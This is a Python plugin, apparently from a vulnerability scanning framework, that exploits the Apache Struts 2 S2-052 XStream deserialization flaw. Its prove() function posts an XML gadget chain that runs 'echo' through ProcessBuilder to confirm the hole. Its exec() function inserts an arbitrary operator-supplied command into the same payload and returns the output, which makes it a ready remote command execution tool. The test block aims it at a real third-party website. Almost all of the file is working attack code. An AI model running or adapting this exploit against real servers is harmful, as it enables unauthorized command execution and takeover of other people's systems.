#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

'''
S2_052 未验证
'''

def info(data=None):
    info = {
        "name": "Struts 2-052",
        "info": "Struts 2-052",
        "level": "high",
        "type": "rec",
    }
    return info

def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        prove_poc = '''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>echo</string><string>struts2_security_vul</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map> '''
        poc_key = "struts2_security_vul"
        try:
            headers = {'Content-Type': "application/xml"}
            res = curl('post', data['url'], data=prove_poc, headers=headers)
            if poc_key in res.headers or poc_key in res.text:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": "struts2_052"})
        except:
            pass
    return data


def exec(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        cmd = data['cmd']
        exec_poc = '''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command>%COMMAND%</command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map>'''
        headers = {}
        try:
            headers['Content-Type'] = "application/xml"
            command = ""
            cmds = cmd.split()
            for each in cmds:
                command += "<string>" + each + "</string>"
            res = curl('post', data['url'], data=exec_poc.replace("%COMMAND%", command), headers=headers).text
            data['flag'] = 1
            data['data'].append({"poc": exec_poc})
            data['res'].append({"info": res, "key": cmd})
        except:
            pass
    return data

def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))